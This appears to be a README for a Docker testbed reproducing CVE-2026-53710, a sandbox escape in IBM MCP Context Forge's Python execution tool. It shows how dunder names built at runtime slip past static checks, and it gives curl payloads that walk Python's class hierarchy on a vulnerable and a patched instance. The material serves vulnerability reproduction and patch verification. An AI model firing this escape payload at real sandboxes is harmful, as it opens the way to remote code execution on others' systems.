# CVE-2026-53710: MCP Context Forge Python Sandbox Escape & RCE Testbed

This testbed provides a reproducible local environment for **CVE-2026-53710** (a critical sandbox escape and remote code execution vulnerability in IBM MCP Context Forge prior to version 1.0.2).

## Vulnerability Overview
* **Component:** `python_sandbox_server` (`execute_code` MCP tool)
* **CVSS Score:** 10.0 (Critical)
* **Description:** The sandbox utility relied on `RestrictedPython` with raw `getattr` exposed in `safe_builtins` and weak static string checks (`validate_code`) to block dangerous dunder attributes. An attacker can construct dunder names dynamically at runtime (e.g., `"__" + "class" + "__"`), traverse Python's class hierarchy, reach underlying execution primitives, and achieve arbitrary code execution.

---

## Environment Setup & Docker Compose

This testbed includes both the **vulnerable** and **patched** versions running side-by-side:
* **Vulnerable Instance:** Port `8080` (runs `server_vulnerable.py`)
* **Patched Instance:** Port `8081` (runs `server_patched.py`)

### Running with Docker Compose
```bash
docker compose up --build -d
```

---

## Verification / Exploitation

### 1. Test Vulnerable Instance (Port 8080) — *Expected: Success*
```bash
curl -X POST "http://127.0.0.1:8080/execute_code" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "cls_attr = \"__\" + \"class\" + \"__\"; bases_attr = \"__\" + \"bases\" + \"__\"; subclasses_attr = \"__\" + \"subclasses\" + \"__\"; b = getattr(getattr(0, cls_attr), bases_attr)[0]; subclasses = getattr(b, subclasses_attr)(); result = str(len(subclasses))"
  }'
```
**Response:** `{"status":"success","output":"670"}`

### 2. Test Patched Instance (Port 8081) — *Expected: Blocked*
```bash
curl -X POST "http://127.0.0.1:8081/execute_code" \
  -H "Content-Type: application/json" \
  -d '{
    "code": "cls_attr = \"__\" + \"class\" + \"__\"; bases_attr = \"__\" + \"bases\" + \"__\"; subclasses_attr = \"__\" + \"subclasses\" + \"__\"; b = getattr(getattr(0, cls_attr), bases_attr)[0]; subclasses = getattr(b, subclasses_attr)(); result = str(len(subclasses))"
  }'
```
**Response:** `{"detail":"Security Violation: Forbidden patterns or dunder attributes detected."}`
